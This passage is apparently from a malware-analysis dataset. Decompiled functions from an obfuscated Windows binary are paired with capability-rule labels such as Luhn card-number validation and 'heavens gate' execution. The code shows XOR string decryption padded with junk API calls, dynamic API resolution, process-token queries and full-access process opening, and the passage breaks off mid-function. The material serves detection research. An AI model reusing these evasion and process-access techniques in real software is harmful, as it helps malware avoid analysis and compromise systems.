        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0040b055(uchar *param_1)\n\n{\n    int16_t iVar1;\n    char cVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t iVar5;\n    int16_t *piVar6;\n    int16_t *piVar7;\n    uchar *puVar8;\n    int32_t iVar9;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int16_t *var_8h;\n    uchar *var_4h;\n    \n    if (param_1 != NULL) {\n        puVar8 = param_1;\n        for (iVar5 = 0x208; iVar5 != 0; iVar5 = iVar5 + -1) {\n            *puVar8 = 0;\n            puVar8 = puVar8 + 1;\n        }\n        var_4h = param_1;\n        cVar2 = (*_sym.imp.KERNEL32.dll_GetVersion)();\n        if (cVar2 == '\\x05') {\n            var_24h = 0x70086802;\n            var_20h = 0x6825392e;\n            var_1ch = 0x39297010;\n            var_18h = 0x70026823;\n            var_14h._0_2_ = 0x3948;\n            var_10h = 0x70676851;\n            var_ch._0_2_ = 0x3948;\n            fcn.00401000(0x24);\n            piVar7 = var_8h;\n            iVar9 = 0;\n            iVar5 = &var_24h - var_8h;\n            do {\n                iVar3 = (*_sym.imp.USER32.dll_GetForegroundWindow)();\n                if (iVar3 != 0x6965fe) {\n                    var_8h = 0x6;\n                    *(iVar9 + piVar7) = *(&var_10h + iVar9 % 6) ^ (iVar9 + piVar7)[iVar5];\n                }\n                iVar9 = iVar9 + 1;\n            } while (iVar9 < 0x12);\n            piVar6 = piVar7;\n            do {\n                iVar1 = *piVar6;\n                *((var_4h - piVar7) + piVar6) = iVar1;\n                piVar6 = piVar6 + 1;\n            } while (iVar1 != 0);\n        }\n        else {\n            var_4ch = 0x6e56353b;\n            var_48h = 0x3941682c;\n            var_44h = 0x35094a19;\n            var_40h = 0x682f6e4b;\n            var_3ch = 0x4a2f3969;\n            var_38h = 0x6e493518;\n            var_34h = 0x3954680e;\n            var_30h = 0x35094a1a;\n            var_2ch = 0x68256e75;\n            var_28h = 0x4a6e3942;\n            var_10h = 0x6e393568;\n            var_ch._0_2_ = CONCAT11(var_ch._1_1_, 0x4a);\n            fcn.00401000(0x50);\n            piVar7 = var_8h;\n            iVar9 = 0;\n            iVar5 = &var_4ch - var_8h;\n            do {\n                iVar3 = (*_sym.imp.USER32.dll_GetMessageExtraInfo)();\n                if (iVar3 != 0xd36f4b) {\n                    var_8h = 0x5;\n                    *(iVar9 + piVar7) = *(&var_10h + iVar9 % 5) ^ (iVar9 + piVar7)[iVar5];\n                }\n                iVar9 = iVar9 + 1;\n            } while (iVar9 < 0x28);\n            piVar6 = piVar7;\n            do {\n                iVar1 = *piVar6;\n                *((var_4h - piVar7) + piVar6) = iVar1;\n                piVar6 = piVar6 + 1;\n            } while (iVar1 != 0);\n        }\n        uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, piVar7);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n    }\n    return;\n}\n",
        "token_count": 1094
    },
    "0040182e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t fcn.0040182e(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint uVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    var_4h = 0;\n    var_30h = 0x571b0413;\n    var_2ch._0_2_ = 0x6c12;\n    var_2ch._2_1_ = 0x43;\n    stack0xffffffd3 = 0x390a4a1c;\n    var_28h._3_1_ = 0x12;\n    var_24h._0_1_ = 0x3f;\n    var_24h._1_1_ = 0x4b;\n    var_24h._2_1_ = 0x65;\n    var_14h = 0x384c775a;\n    var_10h._0_1_ = 0x65;\n    fcn.00401000(0xf);\n    iVar3 = var_ch;\n    iVar8 = 0;\n    var_8h = 5;\n    iVar7 = &var_30h - var_ch;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_GetFocus)();\n        if (iVar4 != 0x9c1a9c) {\n            *(iVar8 + iVar3) = *(&var_14h + iVar8 % var_8h) ^ (iVar8 + iVar3)[iVar7];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0xf);\n    var_30h = 0x291d533c;\n    var_2ch._0_2_ = 0x3b07;\n    var_2ch._2_1_ = 5;\n    stack0xffffffd3 = 0x3b06695d;\n    var_28h._3_1_ = 0x5a;\n    var_24h._0_1_ = 0x6f;\n    var_20h = 0x476f3657;\n    var_1ch._0_1_ = 0x62;\n    fcn.00401000(0xd);\n    iVar3 = var_14h;\n    iVar8 = 0;\n    iVar7 = &var_30h - var_14h;\n    do {\n        iVar5 = (*_sym.imp.USER32.dll_GetForegroundWindow)();\n        iVar4 = var_ch;\n        if (iVar5 != 0x46b089) {\n            *(iVar8 + iVar3) = *(&var_20h + iVar8 % var_8h) ^ (iVar8 + iVar3)[iVar7];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0xd);\n    uVar6 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(iVar3, var_ch);\n    *0x41d210 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar6);\n    if (*0x41d210 != NULL) {\n        iVar7 = (**0x41d210)(var_18h, &var_4h);\n        var_4h = -(iVar7 != 0) & var_4h;\n    }\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_ch = var_4h;\n    uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n    pcVar1 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar6);\n    uVar6 = (*pcVar2)(0, iVar4);\n    (*pcVar1)(uVar6);\n    return var_ch;\n}\n",
        "token_count": 957
    },
    "004045dd": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.004045dd(void)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint noname_0;\n    uint8_t *extraout_ECX;\n    uint8_t *noname_0_00;\n    code *pcVar6;\n    int32_t iVar7;\n    code *pcVar8;\n    uint noname_0_01;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    pcVar6 = _sym.imp.ntdll.dll_RtlRandom;\n    var_10h = 0;\n    var_4h = *0x41ccc0;\n    (*_sym.imp.ntdll.dll_RtlRandom)(0x41ccc0);\n    uVar1 = (*pcVar6)(0x41ccc0);\n    iVar2 = fcn.0040433d(uVar1 & 0xff, 0x41ccc0, 0x41cd20, &var_8h);\n    if (iVar2 == 0) {\n        return var_10h;\n    }\n    iVar2 = fcn.0040433d(0, 0x41ccc0, 0x41cd24, &var_8h);\n    if (iVar2 == 0) {\n        return var_10h;\n    }\n    var_2ch = 0x51307217;\n    var_28h = 0x725c361c;\n    var_24h._0_2_ = 0x5155;\n    var_20h = 0x51557239;\n    var_1ch._0_2_ = 0x3664;\n    fcn.00401000(0x14);\n    iVar2 = var_ch;\n    iVar7 = 0;\n    iVar4 = &var_2ch - var_ch;\n    do {\n        iVar3 = (*_sym.imp.USER32.dll_CreateMenu)();\n        if (iVar3 != 0x660bec) {\n            var_14h = 6;\n            *(iVar7 + iVar2) = *(&var_20h + iVar7 % 6) ^ (iVar7 + iVar2)[iVar4];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 10);\n    (*_sym.imp.KERNEL32.dll_lstrcatW)(*0x41cd24, iVar2);\n    iVar7 = 0;\n    iVar4 = fcn.0040433d(0, 0x41ccc0, 0x41cd1c, &var_8h);\n    if ((iVar4 == 0) || (var_18h = fcn.00408ff1(noname_0, 0),  var_18h == 0)) {\n        uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n        return var_10h;\n    }\n    var_4h = var_4h ^ 0x29787279;\n    var_30h = 0x4c1d5778;\n    var_2ch = 0x7236341a;\n    var_28h = 0x57687920;\n    var_24h._0_2_ = 0x4c72;\n    var_20h = 0x4c725734;\n    var_1ch._0_2_ = CONCAT11(var_1ch._1_1_, 0x79);\n    fcn.00401000(0x1c);\n    iVar2 = var_14h;\n    iVar4 = &var_30h - var_14h;\n    do {\n        iVar3 = (*_sym.imp.USER32.dll_GetCapture)();\n        noname_0_00 = extraout_ECX;\n        if (iVar3 != 0x78704a) {\n            var_14h = 5;\n            noname_0_00 = iVar7 + iVar2;\n            *noname_0_00 = *(&var_20h + iVar7 % 5) ^ noname_0_00[iVar4];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0xe);\n    uVar5 = 1;\n    *0x41cd18 = fcn.00408ff1(noname_0_00, 1);\n    if (*0x41cd18 != 0) {\n        noname_0_01 = 1;\n        var_14h = fcn.00408ff1(uVar5, 1);\n        if (var_14h != 0) {\n            *0x41cd14 = fcn.00408ff1(noname_0_01, 1);\n            iVar4 = *0x41cd14;\n            if (*0x41cd14 != 0) {\n                var_4h = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n                iVar7 = fcn.0040433d(0, &var_4h, 0x41cd10, &var_8h);\n                iVar4 = 0;\n                if (iVar7 != 0) {\n                    var_10h = 1;\n                }\n            }\n            pcVar8 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(iVar4, iVar2);\n            pcVar6 = _sym.imp.KERNEL32.dll_HeapFree;\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n            uVar5 = (*pcVar8)(0, var_ch);\n            (*pcVar6)(uVar5);\n            var_ch = var_14h;\n            goto code_r0x00404830;\n        }\n    }\n    pcVar8 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n    pcVar6 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\ncode_r0x00404830:\n    uVar5 = (*pcVar8)(0, var_ch);\n    (*pcVar6)(uVar5);\n    uVar5 = (*pcVar8)(0, var_18h);\n    (*pcVar6)(uVar5);\n    return var_10h;\n}\n",
        "token_count": 1505
    },
    "00408c8d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00408c8d(uint param_1, uchar *param_2)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    uint *puVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uchar *puVar6;\n    uchar *puVar7;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uchar *var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puVar3 = &var_30h;\n    var_10h = param_2;\n    for (iVar4 = 0x18; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    var_18h = *0x41cd34;\n    uVar5 = 0;\n    var_14h = 0;\n    var_4h = 0;\n    var_30h = 0x18;\n    var_2ch = 0;\n    var_24h = 0;\n    var_28h = 0;\n    var_20h = 0;\n    var_1ch = 0;\n    iVar4 = (*_sym.imp.ntdll.dll_ZwOpenProcess)(&var_ch, 0x400, &var_30h, &var_18h);\n    if (-1 < iVar4) {\n        iVar4 = (*_sym.imp.ntdll.dll_ZwOpenProcessToken)(var_ch, 8, &var_8h);\n        pcVar1 = _sym.imp.ntdll.dll_ZwQueryInformationToken;\n        if (-1 < iVar4) {\n            (*_sym.imp.ntdll.dll_ZwQueryInformationToken)(var_8h, 1, 0, 0, &var_4h);\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_4h);\n            puVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n            if (puVar3 != NULL) {\n                iVar4 = (*pcVar1)(var_8h, 1, puVar3, var_4h, &var_4h);\n                if (-1 < iVar4) {\n                    puVar6 = *puVar3;\n                    puVar7 = var_10h;\n                    for (iVar4 = 0x1c; iVar4 != 0; iVar4 = iVar4 + -1) {\n                        *puVar7 = *puVar6;\n                        puVar6 = puVar6 + 1;\n                        puVar7 = puVar7 + 1;\n                    }\n                    uVar5 = 1;\n                }\n                uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, puVar3);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n            }\n            (*_sym.imp.ntdll.dll_ZwClose)(var_8h);\n        }\n        (*_sym.imp.ntdll.dll_ZwClose)(var_ch);\n    }\n    return uVar5;\n}\n",
        "token_count": 732
    },
    "00409e96": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00409e96(uint arg_8h, uint arg_ch)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    code *pcVar5;\n    uint uVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    int32_t lpModuleName;\n    int32_t var_4h;\n    \n    var_20h = 0x1b280202;\n    var_1ch = 0x2012421e;\n    var_18h._0_2_ = 0x721b;\n    var_10h = 0x774c766c;\n    var_ch._0_1_ = 0x72;\n    fcn.00401000(10);\n    iVar2 = lpModuleName;\n    iVar8 = 0;\n    var_4h = 5;\n    iVar7 = &var_20h - lpModuleName;\n    do {\n        iVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        if (iVar3 != 0x50efc5) {\n            *(iVar8 + iVar2) = *(&var_10h + iVar8 % var_4h) ^ (iVar8 + iVar2)[iVar7];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 10);\n    var_30h = 0x91e2615;\n    var_2ch = 0x23012155;\n    var_28h = 0x222a5316;\n    var_24h._0_2_ = 0x7922;\n    var_1ch = 0x7951514f;\n    var_18h._0_2_ = CONCAT11(var_18h._1_1_, 0x30);\n    fcn.00401000(0xe);\n    iVar2 = var_10h;\n    iVar8 = 0;\n    iVar7 = &var_30h - var_10h;\n    do {\n        iVar3 = (*_sym.imp.KERNEL32.dll_GetCommandLineA)();\n        if (iVar3 != 0x76bbb2) {\n            *(iVar8 + iVar2) = *(&var_1ch + iVar8 % var_4h) ^ (iVar8 + iVar2)[iVar7];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0xe);\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(lpModuleName);\n    pcVar5 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar4, iVar2);\n    uVar4 = (*pcVar5)(var_14h, 0x1f0fff, arg_8h, arg_ch);\n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n    pcVar5 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar6);\n    uVar6 = (*pcVar1)(0, lpModuleName);\n    (*pcVar5)(uVar6);\n    return uVar4;\n}\n",
        "token_count": 792
    },
    "0040ab39": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nulong __cdecl fcn.0040ab39(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t arg_8h_00;\n    uint32_t *puVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    int32_t var_2ch;\n    int32_t var_28h;\n    uint32_t var_24h;\n    int32_t var_20h;\n    uint32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_10h;\n    uint var_ch;\n    int32_t dwSize;\n    \n    iVar2 = fcn.0040a9f0(&var_24h, &dwSize);\n    var_28h = 0;\n    if ((iVar2 == 0) &&\n       (arg_8h_00 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, dwSize, 0x3000, 4),  iVar2 = var_20h,  iVar4 = dwSize, \n       uVar5 = var_24h,  var_10h = arg_8h_00,  arg_8h_00 != 0)) {\n        do {\n            var_1ch = uVar5;\n            var_18h = iVar2;\n            dwSize = arg_8h_00;\n            fcn.00409ffb(arg_8h_00, 0x1000);\n            iVar1 = var_10h;\n            arg_8h_00 = dwSize + 0x1000;\n            var_1ch = uVar5 + 0x1000;\n            var_18h = iVar2 + (0xffffefff < uVar5);\n            iVar4 = iVar4 + -0x1000;\n            iVar2 = var_18h;\n            uVar5 = var_1ch;\n        } while (iVar4 != 0);\n        dwSize = arg_8h_00;\n        puVar3 = fcn.00409305(0x1000);\n        if (puVar3 == NULL) {\n            var_2ch = 0;\n        }\n        else {\n            var_2ch = *puVar3 + var_24h;\n            var_28h = var_20h + CARRY4(*puVar3, var_24h);\n        }\n        (*_sym.imp.KERNEL32.dll_VirtualFree)(iVar1, 0, 0x8000);\n    }\n    else {\n        var_2ch = 0;\n    }\n    return CONCAT44(var_28h, var_2ch);\n}\n",
        "token_count": 578
    },
    "00401a42": {
        "rules": [
            "64-bit execution via heavens gate/cf627f8086064c53962fc93043360d1e"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00401a42(void)\n\n{\n    uint8_t *puVar1;\n    code *pcVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint uVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    int32_t var_c0h;\n    int32_t var_bch;\n    int32_t var_b8h;\n    int32_t var_b4h;\n    int32_t var_b0h;\n    int32_t var_ach;\n    int32_t var_a8h;\n    int32_t var_a4h;\n    int32_t var_a0h;\n    int32_t var_9ch;\n    int32_t var_98h;\n    int32_t var_94h;\n    int32_t var_90h;\n    int32_t var_8ch;\n    int32_t var_88h;\n    int32_t var_84h;\n    int32_t var_80h;\n    int32_t var_7ch;\n    int32_t var_78h;\n    int32_t var_74h;\n    int32_t var_70h;\n    int32_t var_6ch;\n    int32_t var_68h;\n    int32_t var_64h;\n    int32_t var_60h;\n    int32_t var_5ch;\n    int32_t var_58h;\n    int32_t var_54h;\n    int32_t var_50h;\n    int32_t var_4ch;\n    int32_t var_48h;\n    int32_t var_44h;\n    int32_t var_40h;\n    uint var_3ch;\n    uint var_38h;\n    int32_t var_34h;\n    int32_t var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_20h._0_1_ = 0x16;\n    var_20h._1_1_ = 0x54;\n    var_20h._2_1_ = 0x70;\n    var_20h._3_1_ = 0x4b;\n    var_1ch._0_1_ = 0x1d;\n    var_1ch._1_1_ = 0x24;\n    var_1ch._2_1_ = 0x45;\n    var_1ch._3_1_ = 0x56;\n    var_18h._0_1_ = 0x6d;\n    var_18h._1_1_ = 0x17;\n    var_18h._2_1_ = 0x2e;\n    var_18h._3_1_ = 0x54;\n    var_14h._0_1_ = 0x5d;\n    var_14h._1_1_ = 0x69;\n    var_14h._2_1_ = 10;\n    var_14h._3_1_ = 0x2c;\n    var_10h._0_1_ = 0x47;\n    var_10h._1_1_ = 0x5a;\n    var_10h._2_1_ = 0x55;\n    var_10h._3_1_ = 0x1d;\n    var_ch._0_1_ = 0x22;\n    var_ch._1_1_ = 0x54;\n    var_ch._2_1_ = 0x33;\n    var_8h = 0x39333145;\n    var_4h._0_2_ = CONCAT11(var_4h._1_1_, 0x78);\n    fcn.00401000(0x17);\n    iVar8 = 0;\n    var_30h = 5;\n    do {\n        iVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n        if (iVar4 != 0x7a48f9) {\n            *(iVar8 + var_a8h) = *(&var_8h + iVar8 % var_30h) ^ (iVar8 + var_a8h)[&var_20h - var_a8h];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0x17);\n    fcn.0040ba72();\n    var_28h = 0x162f082b;\n    var_24h._0_1_ = 0x1e;\n    var_24h._1_1_ = 0x2b;\n    var_24h._2_2_ = 799;\n    var_20h._0_1_ = 0x3e;\n    var_20h._1_1_ = 0x17;\n    var_20h._2_1_ = 4;\n    var_20h._3_1_ = 0x2f;\n    var_1ch._0_1_ = 0x19;\n    var_1ch._1_1_ = 0x1f;\n    var_1ch._2_1_ = 0x17;\n    var_1ch._3_1_ = 0x31;\n    var_18h._0_1_ = 2;\n    var_18h._1_1_ = 0x29;\n    var_18h._2_1_ = 0x1d;\n    var_18h._3_1_ = 3;\n    var_14h._0_1_ = 0x3e;\n    var_14h._1_1_ = 0x17;\n    var_14h._2_1_ = 4;\n    var_14h._3_1_ = 0x34;\n    var_10h._0_1_ = 0x11;\n    var_10h._1_1_ = 1;\n    var_10h._2_1_ = 0xb;\n    var_10h._3_1_ = 2;\n    var_ch._0_1_ = 8;\n    var_ch._1_1_ = 0x42;\n    var_8h = 0x656e6d78;\n    var_4h._0_2_ = 0x426d;\n    fcn.00401000(0x1e);\n    iVar8 = 0;\n    var_34h = 6;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_CreateMenu)();\n        if (iVar4 != 0xd53bca) {\n            *(iVar8 + var_a0h) = *(&var_8h + iVar8 % var_34h) ^ (iVar8 + var_a0h)[&var_28h - var_a0h];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0x1e);\n    fcn.0040ba72();\n    var_20h._0_1_ = 0x6a;\n    var_20h._1_1_ = 0x50;\n    var_20h._2_1_ = 0x3c;\n    var_20h._3_1_ = 0x5f;\n    var_1ch._0_1_ = 0x16;\n    var_1ch._1_1_ = 0x52;\n    var_1ch._2_1_ = 0x78;\n    var_1ch._3_1_ = 0x15;\n    var_18h._0_1_ = 0x5d;\n    var_18h._1_1_ = 0x1a;\n    var_18h._2_1_ = 0x4b;\n    var_18h._3_1_ = 0x4c;\n    var_14h._0_1_ = 0x20;\n    var_14h._1_1_ = 0x42;\n    var_14h._2_1_ = 0x1c;\n    var_14h._3_1_ = 0x4f;\n    var_10h._0_1_ = 0x5c;\n    var_10h._1_1_ = 0x1c;\n    var_10h._2_1_ = 0x55;\n    var_10h._3_1_ = 0x12;\n    var_ch._0_1_ = 0x5c;\n    var_ch._1_1_ = 0x35;\n    var_8h = 0x30703539;\n    var_4h._0_2_ = CONCAT11(var_4h._1_1_, 0x75);\n    fcn.00401000(0x16);\n    iVar8 = 0;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_CreatePopupMenu)();\n        if (iVar4 != 0xef59ea) {\n            *(iVar8 + var_98h) = *(&var_8h + iVar8 % var_30h) ^ (iVar8 + var_98h)[&var_20h - var_98h];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0x16);\n    fcn.0040ba72();\n    var_24h._0_1_ = 9;\n    var_24h._1_1_ = 0x2e;\n    var_24h._2_2_ = 0x1e11;\n    var_20h._0_1_ = 0x2c;\n    var_20h._1_1_ = 6;\n    var_20h._2_1_ = 0x3f;\n    var_20h._3_1_ = 0x2a;\n    var_1ch._0_1_ = 0x2b;\n    var_1ch._1_1_ = 0x15;\n    var_1ch._2_1_ = 0x1e;\n    var_1ch._3_1_ = 1;\n    var_18h._0_1_ = 0x35;\n    var_18h._1_1_ = 0x3f;\n    var_18h._2_1_ = 0x39;\n    var_18h._3_1_ = 0x20;\n    var_14h._0_1_ = 0x3d;\n    var_14h._1_1_ = 0x1d;\n    var_14h._2_1_ = 0x2c;\n    var_14h._3_1_ = 0x22;\n    var_10h._0_1_ = 0x34;\n    var_10h._1_1_ = 0x15;\n    var_10h._2_1_ = 0x28;\n    var_10h._3_1_ = 0x11;\n    var_ch._0_1_ = 0x5a;\n    var_8h = 0x70584b5a;\n    var_4h._0_2_ = 0x744f;\n    fcn.00401000(0x19);\n    iVar8 = 0;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_GetKBCodePage)();\n        if (iVar4 != 0x4fbdcf) {\n            *(iVar8 + var_90h) = *(&var_8h + iVar8 % var_34h) ^ (iVar8 + var_90h)[&var_24h - var_90h];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0x19);\n    fcn.0040ba72();\n    var_24h._0_1_ = 5;\n    var_24h._1_1_ = 0x2b;\n    var_24h._2_2_ = 0x1a6c;\n    var_20h._0_1_ = 0x4b;\n    var_20h._1_1_ = 9;\n    var_20h._2_1_ = 0x3a;\n    var_20h._3_1_ = 0x27;\n    var_1ch._0_1_ = 0x5a;\n    var_1ch._1_1_ = 0x1d;\n    var_1ch._2_1_ = 0x4c;\n    var_1ch._3_1_ = 3;\n    var_18h._0_1_ = 0x32;\n    var_18h._1_1_ = 7;\n    var_18h._2_1_ = 0x57;\n    var_18h._3_1_ = 4;\n    var_14h._0_1_ = 0x4d;\n    var_14h._1_1_ = 0x12;\n    var_14h._2_1_ = 6;\n    var_14h._3_1_ = 0x3c;\n    var_10h._0_1_ = 0x50;\n    var_10h._1_1_ = 2;\n    var_10h._2_1_ = 0x51;\n    var_10h._3_1_ = 10;\n    var_ch._0_1_ = 0x33;\n    var_ch._1_1_ = 0x29;\n    var_ch._2_1_ = 0x5c;\n    var_ch._3_1_ = 0x74;\n    var_8h = 0x74394e56;\n    var_4h._0_2_ = 0x6638;\n    fcn.00401000(0x1c);\n    iVar8 = 0;\n    do {\n        iVar4 = (*_sym.imp.ADVAPI32.dll_RevertToSelf)();\n        if (iVar4 != 0x18c859) {\n            *(iVar8 + var_88h) = *(&var_8h + iVar8 % var_34h) ^ (iVar8 + var_88h)[&var_24h - var_88h];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0x1c);\n    fcn.0040ba72();\n    var_24h._0_1_ = 0x3b;\n    var_24h._1_1_ = 1;\n    var_24h._2_2_ = 0x257a;\n    var_20h._0_1_ = 0x34;\n    var_20h._1_1_ = 0;\n    var_20h._2_1_ = 0xd;\n    var_20h._3_1_ = 0x59;\n    var_1ch._0_1_ = 0x21;\n    var_1ch._1_1_ = 0x16;\n    var_1ch._2_1_ = 0xb;\n    var_1ch._3_1_ = 7;\n    var_18h._0_1_ = 0x58;\n    var_18h._1_1_ = 0x31;\n    var_18h._2_1_ = 0x39;\n    var_18h._3_1_ = 0x1c;\n    var_14h._0_1_ = 0x34;\n    var_14h._1_1_ = 0x45;\n    var_14h._2_1_ = 0x2d;\n    var_14h._3_1_ = 0x21;\n    var_10h._0_1_ = 1;\n    var_10h._1_1_ = 8;\n    var_10h._2_1_ = 0x52;\n    var_10h._3_1_ = 0x23;\n    var_ch._0_1_ = 0x32;\n    var_ch._1_1_ = 0x68;\n    var_8h = 0x44376468;\n    var_4h._0_2_ = CONCAT11(var_4h._1_1_, 0x57);\n    fcn.00401000(0x1a);\n    iVar8 = 0;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_GetDoubleClickTime)();\n        if (iVar4 != 0xd2a76a) {\n            *(iVar8 + var_80h) = *(&var_8h + iVar8 % var_30h) ^ (iVar8 + var_80h)[&var_24h - var_80h];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0x1a);\n    fcn.0040ba72();\n    var_18h._0_1_ = 0x6b;\n    var_18h._1_1_ = 0x2e;\n    var_18h._2_1_ = 0x66;\n    var_18h._3_1_ = 0x36;\n    var_14h._0_1_ = 9;\n    var_14h._1_1_ = 0x68;\n    var_14h._2_1_ = 0x39;\n    var_14h._3_1_ = 0x5b;\n    var_10h._0_1_ = 0x23;\n    var_10h._1_1_ = 2;\n    var_10h._2_1_ = 0x54;\n    var_10h._3_1_ = 0x2e;\n    var_ch._0_1_ = 0x55;\n    var_ch._1_1_ = 0x30;\n    var_ch._2_1_ = 0x6b;\n    var_8h = 0x55324b38;\n    var_4h._0_2_ = CONCAT11(var_4h._1_1_, 0x6b);\n    fcn.00401000(0xf);\n    iVar8 = 0;\n    do {\n        iVar4 = 